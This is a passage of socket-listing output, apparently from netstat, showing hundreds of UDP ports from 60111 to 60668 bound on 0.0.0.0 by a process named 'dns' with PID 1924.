  UDP        0.0.0.0               60111         *:*                            1924              dns
  UDP        0.0.0.0               60112         *:*                            1924              dns
  UDP        0.0.0.0               60113         *:*                            1924              dns
  UDP        0.0.0.0               60114         *:*                            1924              dns
  UDP        0.0.0.0               60115         *:*                            1924              dns
  UDP        0.0.0.0               60116         *:*                            1924              dns
  UDP        0.0.0.0               60117         *:*                            1924              dns
  UDP        0.0.0.0               60118         *:*                            1924              dns
  UDP        0.0.0.0               60119         *:*                            1924              dns
  UDP        0.0.0.0               60120         *:*                            1924              dns
  UDP        0.0.0.0               60121         *:*                            1924              dns
  UDP        0.0.0.0               60122         *:*                            1924              dns
  UDP        0.0.0.0               60123         *:*                            1924              dns
  UDP        0.0.0.0               60124         *:*                            1924              dns
  UDP        0.0.0.0               60125         *:*                            1924              dns
  UDP        0.0.0.0               60126         *:*                            1924              dns
  UDP        0.0.0.0               60127         *:*                            1924              dns
  UDP        0.0.0.0               60128         *:*                            1924              dns
  UDP        0.0.0.0               60129         *:*                            1924              dns
  UDP        0.0.0.0               60130         *:*                            1924              dns
  UDP        0.0.0.0               60131         *:*                            1924              dns
  UDP        0.0.0.0               60132         *:*                            1924              dns
  UDP        0.0.0.0               60133         *:*                            1924              dns
  UDP        0.0.0.0               60134         *:*                            1924              dns
  UDP        0.0.0.0               60135         *:*                            1924              dns
  UDP        0.0.0.0               60136         *:*                            1924              dns
  UDP        0.0.0.0               60137         *:*                            1924              dns
  UDP        0.0.0.0               60138         *:*                            1924              dns
  UDP        0.0.0.0               60139         *:*                            1924              dns
  UDP        0.0.0.0               60140         *:*                            1924              dns
  UDP        0.0.0.0               60141         *:*                            1924              dns
  UDP        0.0.0.0               60142         *:*                            1924              dns
  UDP        0.0.0.0               60143         *:*                            1924              dns
  UDP        0.0.0.0               60144         *:*                            1924              dns
  UDP        0.0.0.0               60145         *:*                            1924              dns
  UDP        0.0.0.0               60146         *:*                            1924              dns
  UDP        0.0.0.0               60147         *:*                            1924              dns
  UDP        0.0.0.0               60148         *:*                            1924              dns
  UDP        0.0.0.0               60149         *:*                            1924              dns
  UDP        0.0.0.0               60150         *:*                            1924              dns
  UDP        0.0.0.0               60151         *:*                            1924              dns
  UDP        0.0.0.0               60152         *:*                            1924              dns
  UDP        0.0.0.0               60153         *:*                            1924              dns
  UDP        0.0.0.0               60154         *:*                            1924              dns
  UDP        0.0.0.0               60155         *:*                            1924              dns
  UDP        0.0.0.0               60156         *:*                            1924              dns
  UDP        0.0.0.0               60157         *:*                            1924              dns
  UDP        0.0.0.0               60158         *:*                            1924              dns
  UDP        0.0.0.0               60159         *:*                            1924              dns
  UDP        0.0.0.0               60160         *:*                            1924              dns
  UDP        0.0.0.0               60161         *:*                            1924              dns
  UDP        0.0.0.0               60162         *:*                            1924              dns
  UDP        0.0.0.0               60163         *:*                            1924              dns
  UDP        0.0.0.0               60164         *:*                            1924              dns
  UDP        0.0.0.0               60165         *:*                            1924              dns
  UDP        0.0.0.0               60166         *:*                            1924              dns
  UDP        0.0.0.0               60167         *:*                            1924              dns
  UDP        0.0.0.0               60168         *:*                            1924              dns
  UDP        0.0.0.0               60169         *:*                            1924              dns
  UDP        0.0.0.0               60170         *:*                            1924              dns
  UDP        0.0.0.0               60171         *:*                            1924              dns
  UDP        0.0.0.0               60172         *:*                            1924              dns
  UDP        0.0.0.0               60173         *:*                            1924              dns
  UDP        0.0.0.0               60174         *:*                            1924              dns
  UDP        0.0.0.0               60175         *:*                            1924              dns
  UDP        0.0.0.0               60176         *:*                            1924              dns
  UDP        0.0.0.0               60177         *:*                            1924              dns
  UDP        0.0.0.0               60178         *:*                            1924              dns
  UDP        0.0.0.0               60179         *:*                            1924              dns
  UDP        0.0.0.0               60180         *:*                            1924              dns
  UDP        0.0.0.0               60181         *:*                            1924              dns
  UDP        0.0.0.0               60182         *:*                            1924              dns
  UDP        0.0.0.0               60183         *:*                            1924              dns
  UDP        0.0.0.0               60184         *:*                            1924              dns
  UDP        0.0.0.0               60185         *:*                            1924              dns
  UDP        0.0.0.0               60186         *:*                            1924              dns
  UDP        0.0.0.0               60187         *:*                            1924              dns
  UDP        0.0.0.0               60188         *:*                            1924              dns
  UDP        0.0.0.0               60189         *:*                            1924              dns
  UDP        0.0.0.0               60190         *:*                            1924              dns
  UDP        0.0.0.0               60191         *:*                            1924              dns
  UDP        0.0.0.0               60192         *:*                            1924              dns
  UDP        0.0.0.0               60193         *:*                            1924              dns
  UDP        0.0.0.0               60194         *:*                            1924              dns
  UDP        0.0.0.0               60195         *:*                            1924              dns
  UDP        0.0.0.0               60196         *:*                            1924              dns
  UDP        0.0.0.0               60197         *:*                            1924              dns
  UDP        0.0.0.0               60198         *:*                            1924              dns
  UDP        0.0.0.0               60199         *:*                            1924              dns
  UDP        0.0.0.0               60200         *:*                            1924              dns
  UDP        0.0.0.0               60201         *:*                            1924              dns
  UDP        0.0.0.0               60202         *:*                            1924              dns
  UDP        0.0.0.0               60203         *:*                            1924              dns
  UDP        0.0.0.0               60204         *:*                            1924              dns
  UDP        0.0.0.0               60205         *:*                            1924              dns
  UDP        0.0.0.0               60206         *:*                            1924              dns
  UDP        0.0.0.0               60207         *:*                            1924              dns
  UDP        0.0.0.0               60208         *:*                            1924              dns
  UDP        0.0.0.0               60209         *:*                            1924              dns
  UDP        0.0.0.0               60210         *:*                            1924              dns
  UDP        0.0.0.0               60211         *:*                            1924              dns
  UDP        0.0.0.0               60212         *:*                            1924              dns
  UDP        0.0.0.0               60213         *:*                            1924              dns
  UDP        0.0.0.0               60214         *:*                            1924              dns
  UDP        0.0.0.0               60215         *:*                            1924              dns
  UDP        0.0.0.0               60216         *:*                            1924              dns
  UDP        0.0.0.0               60217         *:*                            1924              dns
  UDP        0.0.0.0               60218         *:*                            1924              dns
  UDP        0.0.0.0               60219         *:*                            1924              dns
  UDP        0.0.0.0               60220         *:*                            1924              dns
  UDP        0.0.0.0               60221         *:*                            1924              dns
  UDP        0.0.0.0               60222         *:*                            1924              dns
  UDP        0.0.0.0               60223         *:*                            1924              dns
  UDP        0.0.0.0               60224         *:*                            1924              dns
  UDP        0.0.0.0               60225         *:*                            1924              dns
  UDP        0.0.0.0               60226         *:*                            1924              dns
  UDP        0.0.0.0               60227         *:*                            1924              dns
  UDP        0.0.0.0               60228         *:*                            1924              dns
  UDP        0.0.0.0               60229         *:*                            1924              dns
  UDP        0.0.0.0               60230         *:*                            1924              dns
  UDP        0.0.0.0               60231         *:*                            1924              dns
  UDP        0.0.0.0               60232         *:*                            1924              dns
  UDP        0.0.0.0               60233         *:*                            1924              dns
  UDP        0.0.0.0               60234         *:*                            1924              dns
  UDP        0.0.0.0               60235         *:*                            1924              dns
  UDP        0.0.0.0               60236         *:*                            1924              dns
  UDP        0.0.0.0               60237         *:*                            1924              dns
  UDP        0.0.0.0               60238         *:*                            1924              dns
  UDP        0.0.0.0               60239         *:*                            1924              dns
  UDP        0.0.0.0               60240         *:*                            1924              dns
  UDP        0.0.0.0               60241         *:*                            1924              dns
  UDP        0.0.0.0               60242         *:*                            1924              dns
  UDP        0.0.0.0               60243         *:*                            1924              dns
  UDP        0.0.0.0               60244         *:*                            1924              dns
  UDP        0.0.0.0               60245         *:*                            1924              dns
  UDP        0.0.0.0               60246         *:*                            1924              dns
  UDP        0.0.0.0               60247         *:*                            1924              dns
  UDP        0.0.0.0               60248         *:*                            1924              dns
  UDP        0.0.0.0               60249         *:*                            1924              dns
  UDP        0.0.0.0               60250         *:*                            1924              dns
  UDP        0.0.0.0               60251         *:*                            1924              dns
  UDP        0.0.0.0               60252         *:*                            1924              dns
  UDP        0.0.0.0               60253         *:*                            1924              dns
  UDP        0.0.0.0               60254         *:*                            1924              dns
  UDP        0.0.0.0               60255         *:*                            1924              dns
  UDP        0.0.0.0               60256         *:*                            1924              dns
  UDP        0.0.0.0               60257         *:*                            1924              dns
  UDP        0.0.0.0               60258         *:*                            1924              dns
  UDP        0.0.0.0               60259         *:*                            1924              dns
  UDP        0.0.0.0               60260         *:*                            1924              dns
  UDP        0.0.0.0               60261         *:*                            1924              dns
  UDP        0.0.0.0               60262         *:*                            1924              dns
  UDP        0.0.0.0               60263         *:*                            1924              dns
  UDP        0.0.0.0               60264         *:*                            1924              dns
  UDP        0.0.0.0               60265         *:*                            1924              dns
  UDP        0.0.0.0               60266         *:*                            1924              dns
  UDP        0.0.0.0               60267         *:*                            1924              dns
  UDP        0.0.0.0               60268         *:*                            1924              dns
  UDP        0.0.0.0               60269         *:*                            1924              dns
  UDP        0.0.0.0               60270         *:*                            1924              dns
  UDP        0.0.0.0               60271         *:*                            1924              dns
  UDP        0.0.0.0               60272         *:*                            1924              dns
  UDP        0.0.0.0               60273         *:*                            1924              dns
  UDP        0.0.0.0               60274         *:*                            1924              dns
  UDP        0.0.0.0               60275         *:*                            1924              dns
  UDP        0.0.0.0               60276         *:*                            1924              dns
  UDP        0.0.0.0               60277         *:*                            1924              dns
  UDP        0.0.0.0               60278         *:*                            1924              dns
  UDP        0.0.0.0               60279         *:*                            1924              dns
  UDP        0.0.0.0               60280         *:*                            1924              dns
  UDP        0.0.0.0               60281         *:*                            1924              dns
  UDP        0.0.0.0               60282         *:*                            1924              dns
  UDP        0.0.0.0               60283         *:*                            1924              dns
  UDP        0.0.0.0               60284         *:*                            1924              dns
  UDP        0.0.0.0               60285         *:*                            1924              dns
  UDP        0.0.0.0               60286         *:*                            1924              dns
  UDP        0.0.0.0               60287         *:*                            1924              dns
  UDP        0.0.0.0               60288         *:*                            1924              dns
  UDP        0.0.0.0               60289         *:*                            1924              dns
  UDP        0.0.0.0               60290         *:*                            1924              dns
  UDP        0.0.0.0               60291         *:*                            1924              dns
  UDP        0.0.0.0               60292         *:*                            1924              dns
  UDP        0.0.0.0               60293         *:*                            1924              dns
  UDP        0.0.0.0               60294         *:*                            1924              dns
  UDP        0.0.0.0               60295         *:*                            1924              dns
  UDP        0.0.0.0               60296         *:*                            1924              dns
  UDP        0.0.0.0               60297         *:*                            1924              dns
  UDP        0.0.0.0               60298         *:*                            1924              dns
  UDP        0.0.0.0               60299         *:*                            1924              dns
  UDP        0.0.0.0               60300         *:*                            1924              dns
  UDP        0.0.0.0               60301         *:*                            1924              dns
  UDP        0.0.0.0               60302         *:*                            1924              dns
  UDP        0.0.0.0               60303         *:*                            1924              dns
  UDP        0.0.0.0               60304         *:*                            1924              dns
  UDP        0.0.0.0               60305         *:*                            1924              dns
  UDP        0.0.0.0               60306         *:*                            1924              dns
  UDP        0.0.0.0               60307         *:*                            1924              dns
  UDP        0.0.0.0               60308         *:*                            1924              dns
  UDP        0.0.0.0               60309         *:*                            1924              dns
  UDP        0.0.0.0               60310         *:*                            1924              dns
  UDP        0.0.0.0               60311         *:*                            1924              dns
  UDP        0.0.0.0               60312         *:*                            1924              dns
  UDP        0.0.0.0               60313         *:*                            1924              dns
  UDP        0.0.0.0               60314         *:*                            1924              dns
  UDP        0.0.0.0               60315         *:*                            1924              dns
  UDP        0.0.0.0               60316         *:*                            1924              dns
  UDP        0.0.0.0               60317         *:*                            1924              dns
  UDP        0.0.0.0               60318         *:*                            1924              dns
  UDP        0.0.0.0               60319         *:*                            1924              dns
  UDP        0.0.0.0               60320         *:*                            1924              dns
  UDP        0.0.0.0               60321         *:*                            1924              dns
  UDP        0.0.0.0               60322         *:*                            1924              dns
  UDP        0.0.0.0               60323         *:*                            1924              dns
  UDP        0.0.0.0               60324         *:*                            1924              dns
  UDP        0.0.0.0               60325         *:*                            1924              dns
  UDP        0.0.0.0               60326         *:*                            1924              dns
  UDP        0.0.0.0               60327         *:*                            1924              dns
  UDP        0.0.0.0               60328         *:*                            1924              dns
  UDP        0.0.0.0               60329         *:*                            1924              dns
  UDP        0.0.0.0               60330         *:*                            1924              dns
  UDP        0.0.0.0               60331         *:*                            1924              dns
  UDP        0.0.0.0               60332         *:*                            1924              dns
  UDP        0.0.0.0               60333         *:*                            1924              dns
  UDP        0.0.0.0               60334         *:*                            1924              dns
  UDP        0.0.0.0               60335         *:*                            1924              dns
  UDP        0.0.0.0               60336         *:*                            1924              dns
  UDP        0.0.0.0               60338         *:*                            1924              dns
  UDP        0.0.0.0               60339         *:*                            1924              dns
  UDP        0.0.0.0               60340         *:*                            1924              dns
  UDP        0.0.0.0               60341         *:*                            1924              dns
  UDP        0.0.0.0               60342         *:*                            1924              dns
  UDP        0.0.0.0               60343         *:*                            1924              dns
  UDP        0.0.0.0               60344         *:*                            1924              dns
  UDP        0.0.0.0               60345         *:*                            1924              dns
  UDP        0.0.0.0               60346         *:*                            1924              dns
  UDP        0.0.0.0               60347         *:*                            1924              dns
  UDP        0.0.0.0               60348         *:*                            1924              dns
  UDP        0.0.0.0               60349         *:*                            1924              dns
  UDP        0.0.0.0               60350         *:*                            1924              dns
  UDP        0.0.0.0               60351         *:*                            1924              dns
  UDP        0.0.0.0               60352         *:*                            1924              dns
  UDP        0.0.0.0               60353         *:*                            1924              dns
  UDP        0.0.0.0               60354         *:*                            1924              dns
  UDP        0.0.0.0               60355         *:*                            1924              dns
  UDP        0.0.0.0               60356         *:*                            1924              dns
  UDP        0.0.0.0               60357         *:*                            1924              dns
  UDP        0.0.0.0               60358         *:*                            1924              dns
  UDP        0.0.0.0               60359         *:*                            1924              dns
  UDP        0.0.0.0               60360         *:*                            1924              dns
  UDP        0.0.0.0               60361         *:*                            1924              dns
  UDP        0.0.0.0               60362         *:*                            1924              dns
  UDP        0.0.0.0               60363         *:*                            1924              dns
  UDP        0.0.0.0               60364         *:*                            1924              dns
  UDP        0.0.0.0               60365         *:*                            1924              dns
  UDP        0.0.0.0               60366         *:*                            1924              dns
  UDP        0.0.0.0               60367         *:*                            1924              dns
  UDP        0.0.0.0               60368         *:*                            1924              dns
  UDP        0.0.0.0               60369         *:*                            1924              dns
  UDP        0.0.0.0               60370         *:*                            1924              dns
  UDP        0.0.0.0               60371         *:*                            1924              dns
  UDP        0.0.0.0               60372         *:*                            1924              dns
  UDP        0.0.0.0               60373         *:*                            1924              dns
  UDP        0.0.0.0               60374         *:*                            1924              dns
  UDP        0.0.0.0               60375         *:*                            1924              dns
  UDP        0.0.0.0               60376         *:*                            1924              dns
  UDP        0.0.0.0               60377         *:*                            1924              dns
  UDP        0.0.0.0               60378         *:*                            1924              dns
  UDP        0.0.0.0               60379         *:*                            1924              dns
  UDP        0.0.0.0               60380         *:*                            1924              dns
  UDP        0.0.0.0               60381         *:*                            1924              dns
  UDP        0.0.0.0               60382         *:*                            1924              dns
  UDP        0.0.0.0               60383         *:*                            1924              dns
  UDP        0.0.0.0               60384         *:*                            1924              dns
  UDP        0.0.0.0               60385         *:*                            1924              dns
  UDP        0.0.0.0               60386         *:*                            1924              dns
  UDP        0.0.0.0               60387         *:*                            1924              dns
  UDP        0.0.0.0               60388         *:*                            1924              dns
  UDP        0.0.0.0               60389         *:*                            1924              dns
  UDP        0.0.0.0               60390         *:*                            1924              dns
  UDP        0.0.0.0               60391         *:*                            1924              dns
  UDP        0.0.0.0               60392         *:*                            1924              dns
  UDP        0.0.0.0               60393         *:*                            1924              dns
  UDP        0.0.0.0               60394         *:*                            1924              dns
  UDP        0.0.0.0               60395         *:*                            1924              dns
  UDP        0.0.0.0               60396         *:*                            1924              dns
  UDP        0.0.0.0               60397         *:*                            1924              dns
  UDP        0.0.0.0               60398         *:*                            1924              dns
  UDP        0.0.0.0               60399         *:*                            1924              dns
  UDP        0.0.0.0               60400         *:*                            1924              dns
  UDP        0.0.0.0               60401         *:*                            1924              dns
  UDP        0.0.0.0               60402         *:*                            1924              dns
  UDP        0.0.0.0               60403         *:*                            1924              dns
  UDP        0.0.0.0               60404         *:*                            1924              dns
  UDP        0.0.0.0               60405         *:*                            1924              dns
  UDP        0.0.0.0               60406         *:*                            1924              dns
  UDP        0.0.0.0               60407         *:*                            1924              dns
  UDP        0.0.0.0               60408         *:*                            1924              dns
  UDP        0.0.0.0               60409         *:*                            1924              dns
  UDP        0.0.0.0               60410         *:*                            1924              dns
  UDP        0.0.0.0               60411         *:*                            1924              dns
  UDP        0.0.0.0               60412         *:*                            1924              dns
  UDP        0.0.0.0               60413         *:*                            1924              dns
  UDP        0.0.0.0               60414         *:*                            1924              dns
  UDP        0.0.0.0               60415         *:*                            1924              dns
  UDP        0.0.0.0               60416         *:*                            1924              dns
  UDP        0.0.0.0               60417         *:*                            1924              dns
  UDP        0.0.0.0               60418         *:*                            1924              dns
  UDP        0.0.0.0               60419         *:*                            1924              dns
  UDP        0.0.0.0               60420         *:*                            1924              dns
  UDP        0.0.0.0               60421         *:*                            1924              dns
  UDP        0.0.0.0               60422         *:*                            1924              dns
  UDP        0.0.0.0               60423         *:*                            1924              dns
  UDP        0.0.0.0               60424         *:*                            1924              dns
  UDP        0.0.0.0               60425         *:*                            1924              dns
  UDP        0.0.0.0               60426         *:*                            1924              dns
  UDP        0.0.0.0               60427         *:*                            1924              dns
  UDP        0.0.0.0               60428         *:*                            1924              dns
  UDP        0.0.0.0               60429         *:*                            1924              dns
  UDP        0.0.0.0               60430         *:*                            1924              dns
  UDP        0.0.0.0               60431         *:*                            1924              dns
  UDP        0.0.0.0               60432         *:*                            1924              dns
  UDP        0.0.0.0               60433         *:*                            1924              dns
  UDP        0.0.0.0               60434         *:*                            1924              dns
  UDP        0.0.0.0               60435         *:*                            1924              dns
  UDP        0.0.0.0               60436         *:*                            1924              dns
  UDP        0.0.0.0               60437         *:*                            1924              dns
  UDP        0.0.0.0               60438         *:*                            1924              dns
  UDP        0.0.0.0               60439         *:*                            1924              dns
  UDP        0.0.0.0               60440         *:*                            1924              dns
  UDP        0.0.0.0               60441         *:*                            1924              dns
  UDP        0.0.0.0               60442         *:*                            1924              dns
  UDP        0.0.0.0               60443         *:*                            1924              dns
  UDP        0.0.0.0               60444         *:*                            1924              dns
  UDP        0.0.0.0               60445         *:*                            1924              dns
  UDP        0.0.0.0               60446         *:*                            1924              dns
  UDP        0.0.0.0               60447         *:*                            1924              dns
  UDP        0.0.0.0               60448         *:*                            1924              dns
  UDP        0.0.0.0               60449         *:*                            1924              dns
  UDP        0.0.0.0               60450         *:*                            1924              dns
  UDP        0.0.0.0               60451         *:*                            1924              dns
  UDP        0.0.0.0               60452         *:*                            1924              dns
  UDP        0.0.0.0               60453         *:*                            1924              dns
  UDP        0.0.0.0               60454         *:*                            1924              dns
  UDP        0.0.0.0               60455         *:*                            1924              dns
  UDP        0.0.0.0               60456         *:*                            1924              dns
  UDP        0.0.0.0               60457         *:*                            1924              dns
  UDP        0.0.0.0               60458         *:*                            1924              dns
  UDP        0.0.0.0               60459         *:*                            1924              dns
  UDP        0.0.0.0               60460         *:*                            1924              dns
  UDP        0.0.0.0               60461         *:*                            1924              dns
  UDP        0.0.0.0               60462         *:*                            1924              dns
  UDP        0.0.0.0               60463         *:*                            1924              dns
  UDP        0.0.0.0               60464         *:*                            1924              dns
  UDP        0.0.0.0               60465         *:*                            1924              dns
  UDP        0.0.0.0               60466         *:*                            1924              dns
  UDP        0.0.0.0               60467         *:*                            1924              dns
  UDP        0.0.0.0               60468         *:*                            1924              dns
  UDP        0.0.0.0               60469         *:*                            1924              dns
  UDP        0.0.0.0               60470         *:*                            1924              dns
  UDP        0.0.0.0               60471         *:*                            1924              dns
  UDP        0.0.0.0               60472         *:*                            1924              dns
  UDP        0.0.0.0               60473         *:*                            1924              dns
  UDP        0.0.0.0               60474         *:*                            1924              dns
  UDP        0.0.0.0               60475         *:*                            1924              dns
  UDP        0.0.0.0               60476         *:*                            1924              dns
  UDP        0.0.0.0               60477         *:*                            1924              dns
  UDP        0.0.0.0               60478         *:*                            1924              dns
  UDP        0.0.0.0               60479         *:*                            1924              dns
  UDP        0.0.0.0               60480         *:*                            1924              dns
  UDP        0.0.0.0               60481         *:*                            1924              dns
  UDP        0.0.0.0               60482         *:*                            1924              dns
  UDP        0.0.0.0               60483         *:*                            1924              dns
  UDP        0.0.0.0               60484         *:*                            1924              dns
  UDP        0.0.0.0               60485         *:*                            1924              dns
  UDP        0.0.0.0               60486         *:*                            1924              dns
  UDP        0.0.0.0               60487         *:*                            1924              dns
  UDP        0.0.0.0               60488         *:*                            1924              dns
  UDP        0.0.0.0               60489         *:*                            1924              dns
  UDP        0.0.0.0               60490         *:*                            1924              dns
  UDP        0.0.0.0               60491         *:*                            1924              dns
  UDP        0.0.0.0               60492         *:*                            1924              dns
  UDP        0.0.0.0               60493         *:*                            1924              dns
  UDP        0.0.0.0               60494         *:*                            1924              dns
  UDP        0.0.0.0               60495         *:*                            1924              dns
  UDP        0.0.0.0               60496         *:*                            1924              dns
  UDP        0.0.0.0               60497         *:*                            1924              dns
  UDP        0.0.0.0               60498         *:*                            1924              dns
  UDP        0.0.0.0               60499         *:*                            1924              dns
  UDP        0.0.0.0               60500         *:*                            1924              dns
  UDP        0.0.0.0               60501         *:*                            1924              dns
  UDP        0.0.0.0               60502         *:*                            1924              dns
  UDP        0.0.0.0               60503         *:*                            1924              dns
  UDP        0.0.0.0               60504         *:*                            1924              dns
  UDP        0.0.0.0               60505         *:*                            1924              dns
  UDP        0.0.0.0               60506         *:*                            1924              dns
  UDP        0.0.0.0               60507         *:*                            1924              dns
  UDP        0.0.0.0               60508         *:*                            1924              dns
  UDP        0.0.0.0               60509         *:*                            1924              dns
  UDP        0.0.0.0               60510         *:*                            1924              dns
  UDP        0.0.0.0               60511         *:*                            1924              dns
  UDP        0.0.0.0               60514         *:*                            1924              dns
  UDP        0.0.0.0               60515         *:*                            1924              dns
  UDP        0.0.0.0               60516         *:*                            1924              dns
  UDP        0.0.0.0               60517         *:*                            1924              dns
  UDP        0.0.0.0               60518         *:*                            1924              dns
  UDP        0.0.0.0               60519         *:*                            1924              dns
  UDP        0.0.0.0               60520         *:*                            1924              dns
  UDP        0.0.0.0               60521         *:*                            1924              dns
  UDP        0.0.0.0               60522         *:*                            1924              dns
  UDP        0.0.0.0               60523         *:*                            1924              dns
  UDP        0.0.0.0               60524         *:*                            1924              dns
  UDP        0.0.0.0               60525         *:*                            1924              dns
  UDP        0.0.0.0               60526         *:*                            1924              dns
  UDP        0.0.0.0               60527         *:*                            1924              dns
  UDP        0.0.0.0               60528         *:*                            1924              dns
  UDP        0.0.0.0               60529         *:*                            1924              dns
  UDP        0.0.0.0               60530         *:*                            1924              dns
  UDP        0.0.0.0               60531         *:*                            1924              dns
  UDP        0.0.0.0               60532         *:*                            1924              dns
  UDP        0.0.0.0               60533         *:*                            1924              dns
  UDP        0.0.0.0               60534         *:*                            1924              dns
  UDP        0.0.0.0               60535         *:*                            1924              dns
  UDP        0.0.0.0               60536         *:*                            1924              dns
  UDP        0.0.0.0               60537         *:*                            1924              dns
  UDP        0.0.0.0               60538         *:*                            1924              dns
  UDP        0.0.0.0               60539         *:*                            1924              dns
  UDP        0.0.0.0               60540         *:*                            1924              dns
  UDP        0.0.0.0               60541         *:*                            1924              dns
  UDP        0.0.0.0               60542         *:*                            1924              dns
  UDP        0.0.0.0               60543         *:*                            1924              dns
  UDP        0.0.0.0               60544         *:*                            1924              dns
  UDP        0.0.0.0               60545         *:*                            1924              dns
  UDP        0.0.0.0               60546         *:*                            1924              dns
  UDP        0.0.0.0               60547         *:*                            1924              dns
  UDP        0.0.0.0               60548         *:*                            1924              dns
  UDP        0.0.0.0               60549         *:*                            1924              dns
  UDP        0.0.0.0               60550         *:*                            1924              dns
  UDP        0.0.0.0               60551         *:*                            1924              dns
  UDP        0.0.0.0               60552         *:*                            1924              dns
  UDP        0.0.0.0               60553         *:*                            1924              dns
  UDP        0.0.0.0               60554         *:*                            1924              dns
  UDP        0.0.0.0               60555         *:*                            1924              dns
  UDP        0.0.0.0               60556         *:*                            1924              dns
  UDP        0.0.0.0               60557         *:*                            1924              dns
  UDP        0.0.0.0               60558         *:*                            1924              dns
  UDP        0.0.0.0               60559         *:*                            1924              dns
  UDP        0.0.0.0               60560         *:*                            1924              dns
  UDP        0.0.0.0               60561         *:*                            1924              dns
  UDP        0.0.0.0               60562         *:*                            1924              dns
  UDP        0.0.0.0               60563         *:*                            1924              dns
  UDP        0.0.0.0               60564         *:*                            1924              dns
  UDP        0.0.0.0               60565         *:*                            1924              dns
  UDP        0.0.0.0               60566         *:*                            1924              dns
  UDP        0.0.0.0               60567         *:*                            1924              dns
  UDP        0.0.0.0               60568         *:*                            1924              dns
  UDP        0.0.0.0               60569         *:*                            1924              dns
  UDP        0.0.0.0               60570         *:*                            1924              dns
  UDP        0.0.0.0               60571         *:*                            1924              dns
  UDP        0.0.0.0               60572         *:*                            1924              dns
  UDP        0.0.0.0               60573         *:*                            1924              dns
  UDP        0.0.0.0               60574         *:*                            1924              dns
  UDP        0.0.0.0               60575         *:*                            1924              dns
  UDP        0.0.0.0               60576         *:*                            1924              dns
  UDP        0.0.0.0               60577         *:*                            1924              dns
  UDP        0.0.0.0               60578         *:*                            1924              dns
  UDP        0.0.0.0               60579         *:*                            1924              dns
  UDP        0.0.0.0               60580         *:*                            1924              dns
  UDP        0.0.0.0               60581         *:*                            1924              dns
  UDP        0.0.0.0               60582         *:*                            1924              dns
  UDP        0.0.0.0               60583         *:*                            1924              dns
  UDP        0.0.0.0               60584         *:*                            1924              dns
  UDP        0.0.0.0               60585         *:*                            1924              dns
  UDP        0.0.0.0               60586         *:*                            1924              dns
  UDP        0.0.0.0               60587         *:*                            1924              dns
  UDP        0.0.0.0               60588         *:*                            1924              dns
  UDP        0.0.0.0               60589         *:*                            1924              dns
  UDP        0.0.0.0               60590         *:*                            1924              dns
  UDP        0.0.0.0               60591         *:*                            1924              dns
  UDP        0.0.0.0               60592         *:*                            1924              dns
  UDP        0.0.0.0               60593         *:*                            1924              dns
  UDP        0.0.0.0               60594         *:*                            1924              dns
  UDP        0.0.0.0               60595         *:*                            1924              dns
  UDP        0.0.0.0               60596         *:*                            1924              dns
  UDP        0.0.0.0               60597         *:*                            1924              dns
  UDP        0.0.0.0               60598         *:*                            1924              dns
  UDP        0.0.0.0               60599         *:*                            1924              dns
  UDP        0.0.0.0               60600         *:*                            1924              dns
  UDP        0.0.0.0               60601         *:*                            1924              dns
  UDP        0.0.0.0               60602         *:*                            1924              dns
  UDP        0.0.0.0               60603         *:*                            1924              dns
  UDP        0.0.0.0               60604         *:*                            1924              dns
  UDP        0.0.0.0               60605         *:*                            1924              dns
  UDP        0.0.0.0               60606         *:*                            1924              dns
  UDP        0.0.0.0               60607         *:*                            1924              dns
  UDP        0.0.0.0               60608         *:*                            1924              dns
  UDP        0.0.0.0               60609         *:*                            1924              dns
  UDP        0.0.0.0               60610         *:*                            1924              dns
  UDP        0.0.0.0               60611         *:*                            1924              dns
  UDP        0.0.0.0               60612         *:*                            1924              dns
  UDP        0.0.0.0               60613         *:*                            1924              dns
  UDP        0.0.0.0               60614         *:*                            1924              dns
  UDP        0.0.0.0               60615         *:*                            1924              dns
  UDP        0.0.0.0               60616         *:*                            1924              dns
  UDP        0.0.0.0               60617         *:*                            1924              dns
  UDP        0.0.0.0               60618         *:*                            1924              dns
  UDP        0.0.0.0               60619         *:*                            1924              dns
  UDP        0.0.0.0               60620         *:*                            1924              dns
  UDP        0.0.0.0               60621         *:*                            1924              dns
  UDP        0.0.0.0               60622         *:*                            1924              dns
  UDP        0.0.0.0               60623         *:*                            1924              dns
  UDP        0.0.0.0               60624         *:*                            1924              dns
  UDP        0.0.0.0               60625         *:*                            1924              dns
  UDP        0.0.0.0               60626         *:*                            1924              dns
  UDP        0.0.0.0               60627         *:*                            1924              dns
  UDP        0.0.0.0               60628         *:*                            1924              dns
  UDP        0.0.0.0               60629         *:*                            1924              dns
  UDP        0.0.0.0               60630         *:*                            1924              dns
  UDP        0.0.0.0               60631         *:*                            1924              dns
  UDP        0.0.0.0               60632         *:*                            1924              dns
  UDP        0.0.0.0               60633         *:*                            1924              dns
  UDP        0.0.0.0               60634         *:*                            1924              dns
  UDP        0.0.0.0               60635         *:*                            1924              dns
  UDP        0.0.0.0               60636         *:*                            1924              dns
  UDP        0.0.0.0               60637         *:*                            1924              dns
  UDP        0.0.0.0               60638         *:*                            1924              dns
  UDP        0.0.0.0               60639         *:*                            1924              dns
  UDP        0.0.0.0               60640         *:*                            1924              dns
  UDP        0.0.0.0               60641         *:*                            1924              dns
  UDP        0.0.0.0               60642         *:*                            1924              dns
  UDP        0.0.0.0               60643         *:*                            1924              dns
  UDP        0.0.0.0               60644         *:*                            1924              dns
  UDP        0.0.0.0               60645         *:*                            1924              dns
  UDP        0.0.0.0               60646         *:*                            1924              dns
  UDP        0.0.0.0               60647         *:*                            1924              dns
  UDP        0.0.0.0               60648         *:*                            1924              dns
  UDP        0.0.0.0               60649         *:*                            1924              dns
  UDP        0.0.0.0               60650         *:*                            1924              dns
  UDP        0.0.0.0               60651         *:*                            1924              dns
  UDP        0.0.0.0               60652         *:*                            1924              dns
  UDP        0.0.0.0               60653         *:*                            1924              dns
  UDP        0.0.0.0               60654         *:*                            1924              dns
  UDP        0.0.0.0               60655         *:*                            1924              dns
  UDP        0.0.0.0               60656         *:*                            1924              dns
  UDP        0.0.0.0               60657         *:*                            1924              dns
  UDP        0.0.0.0               60658         *:*                            1924              dns
  UDP        0.0.0.0               60659         *:*                            1924              dns
  UDP        0.0.0.0               60660         *:*                            1924              dns
  UDP        0.0.0.0               60661         *:*                            1924              dns
  UDP        0.0.0.0               60662         *:*                            1924              dns
  UDP        0.0.0.0               60663         *:*                            1924              dns
  UDP        0.0.0.0               60664         *:*                            1924              dns
  UDP        0.0.0.0               60665         *:*                            1924              dns
  UDP        0.0.0.0               60666         *:*                            1924              dns
  UDP        0.0.0.0               60667         *:*                            1924              dns
  UDP        0.0.0.0               60668         *:*                            1924              dns
